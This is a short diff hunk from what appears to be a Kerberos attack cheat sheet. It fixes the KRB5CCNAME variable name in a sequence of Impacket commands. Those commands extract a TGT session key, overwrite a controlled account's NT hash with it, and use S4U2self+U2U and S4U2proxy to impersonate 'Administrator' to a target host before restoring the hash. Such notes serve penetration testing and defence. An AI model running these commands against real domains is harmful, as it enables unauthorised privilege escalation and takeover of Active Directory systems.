@@ -185,7 +185,7 @@ describeTicket.py 'TGT.ccache' | grep 'Ticket Session Key'
 smbpasswd.py -newhashes :TGTSessionKey 'domain'/'controlledaccountwithoutSPN':'SomePassword'@'DomainController'
 
 # Obtain the delegated service ticket through S4U2self+U2U, followed by S4U2proxy (the steps could be conducted individually with the -self and -additional-ticket flags)
-KRBR5CCNAME='TGT.ccache' getST.py -u2u -impersonate "Administrator" -spn "host/target.domain.com" -k -no-pass 'domain'/'controlledaccountwithoutSPN'
+KRB5CCNAME='TGT.ccache' getST.py -u2u -impersonate "Administrator" -spn "host/target.domain.com" -k -no-pass 'domain'/'controlledaccountwithoutSPN'
 
 # The password can then be reset to its old value (or another one if the domain policy forbids it, which is usually the case)
 smbpasswd.py -hashes :TGTSessionKey -newhashes :OldNTHash 'domain'/'controlledaccountwithoutSPN'@'DomainController'
